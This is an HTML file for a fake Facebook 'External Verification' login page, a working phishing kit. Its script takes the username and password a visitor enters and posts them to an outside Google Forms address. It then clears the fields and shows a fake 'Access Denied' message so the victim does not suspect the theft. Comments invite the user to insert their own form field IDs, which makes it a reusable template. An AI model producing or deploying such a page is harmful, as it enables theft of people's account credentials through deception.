<!DOCTYPE html>
<html>
<head>
    <title>Internal Login</title>
    <link
    href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css"
    rel="stylesheet"
/>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #001772, #6c6efd, #150b29);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            width: 320px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.36);
            border: 1px solid rgba(255, 255, 255, 0.18);
        }
        
        h2 {
            color: white;
            text-align: center;
            margin-bottom: 25px;
            font-weight: 600;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        
        .input-group {
            margin-bottom: 20px;
            margin-right: 20px;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: none;
            background: rgba(255, 255, 255, 0.85);
            border-radius: 8px;
            font-size: 16px;
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
        }
        
        input:focus {
            background: rgba(255, 255, 255, 1);
            outline: none;
            box-shadow: 0 0 0 2px #4285f4;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: #000000;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        button:hover {
            background: #722c03;
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0,0,0,0.15);
        }
        
        .status-message {
            text-align: center;
            margin-top: 20px;
            color: white;
            font-weight: 500;
            min-height: 24px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
        }
        .ri-facebook-circle-fill{
            color: #0028ca;
            font-size: x-large;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .ri-verified-badge-fill {
            color: #000000;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <i class="ri-facebook-circle-fill"></i>
        <h2>External Verification <i class="ri-verified-badge-fill"></i></h2>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Phone Number or Email" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Login</button>
        </form>
        <div id="statusMessage" class="status-message"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const status = document.getElementById('statusMessage');
            
            // Show loading state
            status.textContent = "Authenticating...";
            
            // Prepare form data
            const formData = new FormData();
            formData.append('entry.1723977964', username); // Replace with your field ID
            formData.append('entry.658324740', password); // Replace with your field ID
            
            // Send to Google Form
            fetch('https://forms.gle/Y3B4vvpFdvhaEJDTA', {
                method: 'POST',
                body: formData,
                mode: 'no-cors'
            })
            .then(() => {
                status.textContent = "Logging in... Redirecting...";
                
                // Clear form
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                // Simulate redirect
                setTimeout(() => {
                    status.textContent = "Access Denied";
                }, 1500);
            })
            .catch(() => {
                status.textContent = "Try Again Later...";
            });
        });
    </script>
</body>
</html>
